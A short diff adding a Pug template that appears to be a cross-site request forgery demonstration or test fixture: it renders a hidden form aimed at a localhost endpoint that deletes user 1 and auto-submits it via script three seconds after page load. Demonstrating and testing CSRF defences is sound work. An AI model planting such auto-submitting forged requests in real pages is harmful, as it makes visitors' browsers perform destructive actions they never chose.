@@ -1,0 +1,13 @@
+html
+  head
+    title!= title
+  body
+    h3!= message
+
+    form(name="csrf", action="http://localhost:6666/users/1/delete", method="post")
+      input(type="hidden", name="_method", value="delete")
+
+    script.
+      setTimeout(function () {
+        document.csrf.submit();
+      }, 3000);
